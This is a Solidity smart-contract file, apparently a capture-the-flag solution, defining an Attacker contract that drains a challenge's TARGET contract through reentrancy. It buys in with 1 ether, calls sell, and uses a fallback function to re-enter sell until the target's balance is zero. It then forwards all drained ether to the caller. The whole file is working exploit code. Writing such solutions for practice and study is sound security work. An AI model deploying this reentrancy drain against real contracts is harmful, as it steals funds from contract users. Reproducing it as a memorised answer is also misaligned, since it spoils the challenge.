// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Setup.sol";

contract Attacker {
    Setup public immutable SETUP;

    constructor(address setup) payable {
        SETUP = Setup(setup);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);

        uint256 targetInitialBalance = address(SETUP.TARGET()).balance;

        SETUP.TARGET().buy{value: 1 ether}();
        SETUP.TARGET().sell(1 ether);

        uint256 targetFinalBalance = address(SETUP.TARGET()).balance;

        require(targetInitialBalance > targetFinalBalance, "Operation failed");
        require(targetFinalBalance == 0, "Target still has balance");
        (bool success,) = (msg.sender).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    fallback() external payable {
        uint256 balance = address(SETUP.TARGET()).balance;
        uint256 amount = 1 ether <= balance ? 1 ether : balance;
        if (amount > 0) {
            SETUP.TARGET().sell(amount);
        }
    }
}
